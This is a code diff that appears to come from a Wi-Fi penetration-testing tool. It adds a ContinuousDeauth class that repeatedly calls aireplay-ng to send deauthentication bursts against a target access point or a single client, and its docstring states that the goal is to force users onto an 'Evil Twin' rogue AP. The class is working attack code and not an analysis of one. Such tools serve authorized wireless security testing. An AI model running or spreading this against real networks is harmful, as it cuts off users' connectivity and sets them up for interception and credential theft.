@@ -393,6 +393,159 @@ class Aireplay(Thread, Dependency):
                 proc.interrupt()
             time.sleep(0.2)
 
+
+class ContinuousDeauth(Thread):
+    """
+    Continuous deauthentication attack for Evil Twin.
+
+    Sends deauth packets at configurable intervals to force clients
+    to disconnect from the legitimate AP. Can pause when clients
+    connect to the rogue AP.
+    """
+
+    def __init__(self, target_bssid, interface, essid=None, client_mac=None,
+                 interval=5, num_deauths=5, broadcast=True):
+        """
+        Initialize continuous deauth.
+
+        Args:
+            target_bssid: BSSID of the legitimate AP to deauth from
+            interface: Wireless interface in monitor mode
+            essid: ESSID of the target (optional)
+            client_mac: Specific client to deauth (None = broadcast)
+            interval: Seconds between deauth bursts
+            num_deauths: Number of deauth packets per burst
+            broadcast: If True, deauth all clients; if False, only target client_mac
+        """
+        super().__init__()
+        self.daemon = True
+        self.target_bssid = target_bssid
+        self.interface = interface
+        self.essid = essid
+        self.client_mac = client_mac
+        self.interval = interval
+        self.num_deauths = num_deauths
+        self.broadcast = broadcast
+        self.running = False
+        self.paused = False
+        self.process = None
+        self.total_deauths_sent = 0
+        self.last_deauth_time = 0
+
+        # Statistics
+        self.start_time = None
+        self.deauth_count = 0
+
+    def run(self):
+        """Main deauth loop."""
+        self.running = True
+        self.start_time = time.time()
+
+        while self.running:
+            try:
+                # Check if paused
+                if self.paused:
+                    time.sleep(0.5)
+                    continue
+
+                # Check if it's time to send deauth
+                current_time = time.time()
+                if current_time - self.last_deauth_time >= self.interval:
+                    self._send_deauth_burst()
+                    self.last_deauth_time = current_time
+                    self.deauth_count += 1
+
+                time.sleep(0.5)
+
+            except Exception as e:
+                from ..util.color import Color
+                Color.pl('{!} {R}Deauth error: %s{W}' % str(e))
+                time.sleep(1)
+
+    def _send_deauth_burst(self):
+        """Send a burst of deauth packets."""
+        try:
+            # Build deauth command
+            deauth_cmd = [
+                'aireplay-ng',
+                '-0',  # Deauthentication
+                str(self.num_deauths),
+                '--ignore-negative-one',
+                '-a', self.target_bssid,  # Target AP
+                '-D'  # Skip AP detection
+            ]
+
+            # Add client-specific or broadcast deauth
+            if not self.broadcast and self.client_mac:
+                deauth_cmd.extend(['-c', self.client_mac])
+
+            # Add ESSID if provided
+            if self.essid:
+                deauth_cmd.extend(['-e', self.essid])
+
+            deauth_cmd.append(self.interface)
+
+            # Execute deauth
+            self.process = Process(deauth_cmd, devnull=True)
+
+            # Wait for completion with timeout
+            timeout = 3
+            start = time.time()
+            while self.process.poll() is None:
+                if time.time() - start > timeout:
+                    self.process.interrupt()
+                    break
+                time.sleep(0.1)
+
+            self.total_deauths_sent += self.num_deauths
+
+        except Exception as e:
+            from ..util.color import Color
+            Color.pl('{!} {R}Failed to send deauth: %s{W}' % str(e))
+
+    def pause(self):
+        """Pause deauthentication (e.g., when clients connect to rogue AP)."""
+        self.paused = True
+
+    def resume(self):
+        """Resume deauthentication."""
+        self.paused = False
+
+    def is_paused(self):
+        """Check if deauth is paused."""
+        return self.paused
+
+    def stop(self):
+        """Stop continuous deauth."""
+        self.running = False
+
+        # Stop any running process
+        if self.process and self.process.poll() is None:
+            try:
+                self.process.interrupt()
+            except:
+                pass
+
+        # Wait for thread to finish
+        if self.is_alive():
+            self.join(timeout=2)
+
+    def get_stats(self):
+        """
+        Get deauth statistics.
+
+        Returns:
+            dict with statistics
+        """
+        elapsed = time.time() - self.start_time if self.start_time else 0
+        return {
+            'total_deauths': self.total_deauths_sent,
+            'deauth_bursts': self.deauth_count,
+            'elapsed_time': elapsed,
+            'paused': self.paused,
+            'running': self.running
+        }
+
     @staticmethod
     def fakeauth(target, timeout=5, num_attempts=3):
         """
